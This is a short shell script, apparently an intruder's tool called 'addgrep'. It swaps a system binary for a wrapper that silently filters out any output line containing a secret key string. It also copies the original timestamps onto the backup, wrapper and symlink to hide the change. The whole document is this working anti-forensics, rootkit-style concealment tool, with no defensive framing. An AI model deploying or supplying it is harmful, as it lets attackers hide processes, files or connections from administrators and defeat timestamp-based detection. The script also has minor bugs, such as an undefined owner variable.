#!/bin/sh
#
# addgrep
# Wrap a binary in a script to grep out lines
# By J. Stuart McMurray
# Created 20160226
# Last Modified 20160226

set -e

DEFKEY="zzzzzzz"
DEFOWN="root"
DEFGRP="wheel"
DEFPRM="755"

if [ "x" == "x$KEY" ]; then
        export KEY=$DEFKEY # Grep out lines with this
fi

usage() {
        echo "Usage: $0 <binary>" >&2
        echo >&2
        echo "Wraps binary so the lines with \"$KEY\" are removed." >&2
        echo "The grepped-out string may be changed by setting the" >&2
        echo "KEY environment variable." >&2
        exit 1
}

# Usage
if [ "-h" == "$1" ]; then
        usage
fi
if [ "x" == "x$1" ]; then
        usage
fi

# Find the binary
BIN=$(which $1)
if [ "x" == "x${BIN}" ]; then
        echo "Can't find $1!" >&2
        exit 3
fi

# Backup name
BAK=${BIN}.bak

# Make sure it's not already backed up
if [ -e ${BAK} ]; then
        echo "${BAK} already exists!" >&2
        exit 2
fi

# Wrapper name
WRAP=${BIN}.wrap

# Make sure there's not one of those, either
if [ -e ${WRAP} ]; then
        echo "${WRAP} alreay exists!" >&2
        exit 4
fi

# Find grep
GREP=$(which grep)
if [ "x" == "x${GREP}" ]; then
        echo "Can't find grep!" >&2
fi

# Back it up 
cp $BIN $BAK
echo "Backed up $BIN to $BAK"
touch -r $BIN $BAK
ls -l $BIN $BAK


# Make the wrapper
echo '#!/bin/sh' > ${WRAP}
echo "${BAK} \"\$@\" | $GREP -v '${KEY}'" >> ${WRAP}
chown ${DEFUSR}:${DEFGRP} $WRAP
chmod $DEFPRM $WRAP
touch -r $BIN $WRAP
echo "Made the wrapper"
ls -l $WRAP

# Make it work
rm -f $BIN && ln -s $WRAP $BIN
touch -r $BAK $BIN
echo "Linked"
ls -l $BIN

echo
echo "Done."
